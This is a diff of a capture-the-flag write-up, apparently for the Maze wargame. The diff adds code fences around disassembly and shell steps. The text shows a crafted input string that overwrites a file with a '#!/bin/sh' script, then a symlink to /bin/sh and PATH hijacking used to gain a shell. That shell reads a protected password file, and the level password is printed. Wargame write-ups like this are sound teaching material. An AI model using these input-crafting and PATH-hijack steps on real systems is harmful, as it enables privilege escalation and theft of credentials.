@@ -1,4 +1,5 @@
 disassembly:
+```assembly
 0x080485fb <+0>:	push   ebp
    0x080485fc <+1>:	mov    ebp,esp
    0x080485fe <+3>:	sub    esp,0xb0
@@ -94,6 +95,7 @@ disassembly:
    0x0804871c <+289>:	mov    eax,0x0
    0x08048721 <+294>:	leave  
    0x08048722 <+295>:	ret
+```
 
 so, to trick the program, we create the sequence:
 "AAAABBBBCCCCDDDDEEEEFFFFGGGG!!!!ABCDEFGHIJKLMNOPQRSTUVXYWZ"
@@ -112,11 +114,13 @@ no we want to put in it a shell: google the usage...
 --> "#!/bin/shCCCDDDDEEEEFFFFGGGG\x20\x00\x00\x00ABCDEFGHIJKL\x01\x00\x00\x00QRSTUVXYWZ"
 where s,h are to be multiplied --> change to s * h = 11960 = 0x2eb8:
 --> "#!/bin/sh\x0aAAAAAAAAAAAAAAAAA\x0a\x20\x00\x00\x00ABCDEFGHIJKL\xb8\x2e\x00\x00QRSTUVXYWZ"
+```sh
 chmod +x a
 ln -s /bin/sh AAAAAAAAAAAAAAAAA
 PATH=.:PATH
 $ cat /etc/maze_pass/maze5
 ishipaeroo
+```
 
 we get:
 ishipaeroo
